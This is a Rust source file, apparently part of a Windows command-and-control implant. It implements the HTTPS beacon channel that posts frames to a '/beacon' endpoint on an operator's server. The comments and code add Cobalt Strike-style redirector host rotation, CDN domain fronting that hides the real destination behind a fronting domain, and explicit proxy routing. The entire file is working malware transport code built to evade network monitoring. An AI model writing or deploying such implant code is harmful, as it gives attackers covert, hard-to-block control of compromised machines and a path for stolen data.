//! HTTPS channel — the primary/default egress transport (spec-7 enhanced).
//!
//! Wraps `transport::post_frame_enhanced()` with CS 4.10-style host rotation,
//! domain fronting, and explicit proxy support. When no enhancement config is
//! present, falls back to the plain `post_frame()` path (identical to pre-spec-7
//! behaviour).
//!
//! ## Enhancements (spec-7)
//!
//! - **Host rotation**: `ctx.rotation_hosts` is a comma-separated list of
//!   redirector hosts. Each beacon cycle picks the next one (round-robin). On
//!   failure, the host is skipped (hold semantics). When empty, always uses
//!   `ctx.server_host`.
//! - **Domain fronting**: `ctx.fronting_host` overrides the HTTP `Host:`
//!   header. The TCP connection goes to the rotation/server host (a CDN IP),
//!   but the Host header and SNI carry the fronting domain — classic CDN
//!   domain-fronting technique.
//! - **Explicit proxy**: `ctx.proxy_server` (`"host:port"`) routes the request
//!   through a specified proxy instead of the system default.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use super::ChannelCtx;

/// Send `frame` as an HTTPS POST to `/beacon` and return the response body.
///
/// When any spec-7 enhancement is configured (rotation_hosts, fronting_host,
/// proxy_server), uses the enhanced WinHTTP path (`post_frame_enhanced`).
/// Otherwise falls back to the plain `post_frame` for zero overhead.
pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
    // Determine which host to connect to this cycle.
    let host_bytes: &[u8] = match super::select_rotation_host(&ctx.rotation_hosts) {
        Some(h) => h,
        None => ctx.server_host.as_bytes(),
    };

    // Check if any enhancement is active.
    let has_fronting = !ctx.fronting_host.is_empty();
    let has_proxy = !ctx.proxy_server.is_empty();
    let has_rotation = !ctx.rotation_hosts.is_empty();

    if !has_fronting && !has_proxy && !has_rotation {
        // Fast path: no enhancements — use the original post_frame (less overhead,
        // identical behaviour to pre-spec-7).
        return unsafe {
            crate::transport::post_frame(
                ctx.server_host.as_bytes(),
                ctx.server_port,
                b"/beacon",
                frame,
                ctx.use_tls,
            )
        };
    }

    // Enhanced path: proxy + domain fronting.
    let opts = crate::transport::HttpOpts {
        fronting_host: if has_fronting {
            ctx.fronting_host.as_bytes()
        } else {
            b""
        },
        proxy_url: if has_proxy {
            ctx.proxy_server.as_bytes()
        } else {
            b""
        },
    };

    let result = unsafe {
        crate::transport::post_frame_enhanced(
            host_bytes,
            ctx.server_port,
            b"/beacon",
            frame,
            ctx.use_tls,
            &opts,
        )
    };

    // On failure with rotation active, advance past this host (CS 4.10 hold).
    if result.is_none() && has_rotation {
        super::advance_rotation_host();
    }

    result
}
